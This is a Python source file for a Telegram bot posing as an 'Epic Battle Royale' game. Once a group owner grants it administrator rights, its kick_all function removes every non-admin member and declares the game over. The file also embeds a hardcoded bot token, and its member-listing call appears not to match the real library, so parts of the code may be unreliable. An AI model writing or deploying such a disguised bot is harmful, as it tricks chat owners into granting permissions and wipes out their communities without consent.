import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatMemberStatus
from telegram.ext import Application, CommandHandler, ChatMemberHandler, ContextTypes

TOKEN = os.getenv("BOT_TOKEN", "8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")
BOT_USERNAME = os.getenv("BOT_USERNAME", "GameBattleRoyaleBot")

def get_add_button():
    keyboard = [[InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start")]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎮 Добро пожаловать в Epic Battle Royale!\n"
        "Добавьте бота в группу, чтобы начать игру.",
        reply_markup=get_add_button()
    )

async def on_bot_added(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = update.my_chat_member
    if result.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
        chat_id = result.chat.id
        await context.bot.send_message(chat_id, "🎮 Бот активирован! Дайте мне права администратора для игры.")
        await asyncio.sleep(10)
        bot_member = await context.bot.get_chat_member(chat_id, context.bot.id)
        if bot_member.status == ChatMemberStatus.ADMINISTRATOR and bot_member.can_restrict_members:
            await kick_all(chat_id, context)
        else:
            await context.bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")

async def kick_all(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    try:
        async for member in context.bot.get_chat_members(chat_id):
            if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
                try:
                    await context.bot.ban_chat_member(chat_id, member.user.id)
                    await context.bot.unban_chat_member(chat_id, member.user.id)
                except Exception:
                    pass
        await context.bot.send_message(chat_id, "✅ Все участники кикнуты. Игра окончена.")
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Ошибка: {e}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(ChatMemberHandler(on_bot_added, ChatMemberHandler.MY_CHAT_MEMBER))
    # Исправленный вызов polling с разрешёнными обновлениями
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
